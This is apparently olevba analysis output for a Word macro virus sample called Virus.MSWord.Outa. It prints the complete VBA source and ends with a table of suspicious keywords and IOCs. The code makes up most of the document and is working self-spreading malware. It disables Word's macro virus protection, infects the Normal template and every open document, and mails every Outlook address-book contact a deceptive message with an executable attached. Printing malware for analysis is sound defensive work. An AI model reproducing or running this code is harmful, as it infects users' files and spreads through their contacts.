olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Outa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Outa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Outa - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Module1", Object:=wdOrganizerObjectProjectItems
End Sub
Sub FileSave()
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set DirSys = fso.GetSpecialFolder(1)
vcode = DirSys & "\win32k.dll"
ThisDocument.VBProject.VBComponents(2).Export (vcode)
If NormalTemplate.VBProject.VBComponents.Count = 2 Then
    NormalTemplate.VBProject.VBComponents(2).Export (vcode)
End If
For i = 1 To Documents.Count
    installed = False
    If Documents(i).VBProject.VBComponents.Count = 2 Then
        If Documents(i).VBProject.VBComponents(2).Name = "Module1" Then
            installed = True
        End If
    End If
    If installed = False Then
        Documents(i).VBProject.VBComponents.Import (vcode)
        Documents(i).Save
    End If
Next
If ActiveDocument.VBProject.VBComponents.Count = 2 Then
    If ActiveDocument.VBProject.VBComponents(2).Name = "Module1" Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Module1", Object:=wdOrganizerObjectProjectItems
    End If
End If
NormalTemplate.Save
Set Outlook = CreateObject("Outlook.Application")
Set mapi = Outlook.GetNameSpace("MAPI")
ThisDocument.Save
doc = ThisDocument.FullName
For i = 1 To mapi.AddressLists.Count
    Set a = mapi.AddressLists(i)
    For x = 1 To a.AddressEntries.Count
        Set newMail = Outlook.CreateItem(0)
        newMail.Recipients.Add (a.AddressEntries(x))
        newMail.Subject = "You should look at this"
        newMail.Body = "Hello," & vbCrLf & "I found these files on my HDD and it seems it's yours. Please check them out and give me know." & vbCrLf & "Thank you."
        newMail.Attachments.Add (DirSys & "\next.exe")
        newMail.Attachments.Add (doc)
        newMail.Send
    Next
Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |win32k.dll          |Executable file name                         |
|IOC       |next.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

